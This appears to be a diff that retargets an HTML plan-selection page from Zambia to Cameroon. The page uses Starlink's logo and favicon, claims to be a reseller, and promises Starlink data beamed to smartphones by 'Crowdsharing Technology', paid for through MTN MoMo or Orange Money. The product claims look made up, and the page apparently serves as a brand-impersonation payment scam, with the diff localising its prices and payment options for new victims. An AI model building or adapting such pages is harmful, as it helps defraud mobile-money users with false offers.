@@ -1,11 +1,10 @@
 <!DOCTYPE html>
-
 <html lang="en">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Starlink Zambia - Select Your Plan</title>
+    <title>Starlink Cameroon - Select Your Plan</title>
     <link rel="icon" type="image/png" href="https://www.starlink.com/favicon.ico">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
@@ -15,38 +14,38 @@
             --momo-yellow: #FFCC00;
             --momo-dark: #333333;
         }
-        
+
         .starlink-black {
             background-color: #000000;
         }
-        
+
         .momo-yellow-bg {
             background-color: var(--momo-yellow);
         }
-        
+
         .momo-gradient {
             background: linear-gradient(135deg, var(--momo-yellow) 0%, #FFD633 100%);
         }
-        
+
         .card-shadow {
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
         }
-        
+
         .package-card {
             transition: transform 0.3s ease, box-shadow 0.3s ease;
             cursor: pointer;
         }
-        
+
         .package-card:hover {
             transform: translateY(-4px);
             box-shadow: 0 8px 12px rgba(0, 0, 0, 0.15);
         }
-        
+
         .package-card.selected {
             border: 2px solid #000;
             background-color: #f8fafc;
         }
-        
+
         body {
             padding-top: 72px;
             /* Height of fixed header */
@@ -62,7 +61,7 @@
         <div class="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
             <a href="/" class="flex items-center gap-2">
                 <img src="starlink_logo.png" alt="STARLINK" class="h-8">
-                <span class="text-sm border-l pl-2 ml-2 border-gray-600 hidden sm:inline">Zambia Reseller</span>
+                <span class="text-sm border-l pl-2 ml-2 border-gray-600 hidden sm:inline">Cameroon Reseller</span>
             </a>
             <nav class="hidden md:flex gap-6">
                 <a href="/dashboard/" class="text-gray-300 hover:text-white flex items-center gap-2">
@@ -80,7 +79,6 @@
 
     <!-- Messages -->
 
-
     <!-- Main Content -->
     <main class="max-w-7xl mx-auto px-4 py-8">
 
@@ -89,8 +87,8 @@
             <div class="bg-gradient-to-br from-[#FFCC00] to-[#FFD633] text-white p-8 sm:p-10 rounded-2xl text-center card-shadow relative overflow-hidden">
                 <div class="relative z-10">
                     <h1 class="text-3xl sm:text-4xl font-bold mb-4 tracking-tight">High-Speed Internet</h1>
-                    <p class="text-lg sm:text-xl text-gray-800 max-w-2xl mx-auto">Experience the future of connectivity with our **Shared Satellite Network**. Using advanced **Crowdsharing Technology**, we deliver high-speed Starlink data directly to your smartphone, anywhere in Zambia. Choose your plan and join
-                        the network instantly using MTN MoMo.</p>
+                    <p class="text-lg sm:text-xl text-gray-800 max-w-2xl mx-auto">Experience the future of connectivity with our **Shared Satellite Network**. Using advanced **Crowdsharing Technology**, we deliver high-speed Starlink data directly to your smartphone, anywhere in Cameroon. Choose your plan and join
+                        the network instantly using MTN MoMo or Orange Money.</p>
                 </div>
                 <div class="absolute top-0 left-0 w-full h-full opacity-20">
                     <div class="absolute inset-0 bg-gradient-to-r from-blue-900 to-transparent"></div>
@@ -114,7 +112,7 @@
                             </div>
                             <p class="text-gray-600 mb-6 flex-grow text-sm">Up to 12 devices. Perfect for small households.</p>
                             <div class="mt-auto">
-                                <span class="text-3xl font-bold text-gray-900">ZMW 15.00</span>
+                                <span class="text-3xl font-bold text-gray-900">FCFA 4,500</span>
                                 <span class="text-gray-500 text-xs">/month</span>
                             </div>
                         </div>
@@ -126,7 +124,7 @@
                             </div>
                             <p class="text-gray-600 mb-6 flex-grow text-sm">Up to 25 devices. High-speed, low-latency internet.</p>
                             <div class="mt-auto">
-                                <span class="text-3xl font-bold text-gray-900">ZMW 25.00</span>
+                                <span class="text-3xl font-bold text-gray-900">FCFA 9,000</span>
                                 <span class="text-gray-500 text-xs">/month</span>
                             </div>
                         </div>
@@ -138,7 +136,7 @@
                             </div>
                             <p class="text-gray-600 mb-6 flex-grow text-sm">Up to 50 devices. Best for high-demand users.</p>
                             <div class="mt-auto">
-                                <span class="text-3xl font-bold text-gray-900">ZMW 45.00</span>
+                                <span class="text-3xl font-bold text-gray-900">FCFA 18,000</span>
                                 <span class="text-gray-500 text-xs">/month</span>
                             </div>
                         </div>
@@ -150,7 +148,7 @@
                             </div>
                             <p class="text-gray-600 mb-6 flex-grow text-sm">Unlimited devices. Maximum performance for power users.</p>
                             <div class="mt-auto">
-                                <span class="text-3xl font-bold text-gray-900">ZMW 95.00</span>
+                                <span class="text-3xl font-bold text-gray-900">FCFA 65,000</span>
                                 <span class="text-gray-500 text-xs">/month</span>
                             </div>
                         </div>
@@ -173,27 +171,6 @@
                 <p class="text-sm text-gray-400 mt-4">Please do not refresh the page</p>
             </div>
         </div>
-
-        <script>
-            function selectPackage(id, element) {
-                // Set the selected package ID
-                document.getElementById('selected_package_id').value = id;
-
-                // Update visual selection
-                document.querySelectorAll('.package-card').forEach(card => {
-                    card.classList.remove('selected', 'ring-2', 'ring-black');
-                });
-                element.classList.add('selected', 'ring-2', 'ring-black');
-
-                // Show redirect modal immediately
-                document.getElementById('redirectModal').classList.remove('hidden');
-
-                // Submit form after short delay
-                setTimeout(() => {
-                    document.getElementById('orderForm').submit();
-                }, 1500);
-            }
-        </script>
 
     </main>
 
@@ -223,6 +200,7 @@
 
         </div>
     </nav>
+
     <script>
         function selectPackage(id, element) {
             // Set the selected package ID
@@ -232,7 +210,6 @@
             document.querySelectorAll('.package-card').forEach(card => {
                 card.classList.remove('selected', 'ring-2', 'ring-black');
             });
-
             element.classList.add('selected', 'ring-2', 'ring-black');
 
             // Show redirect modal
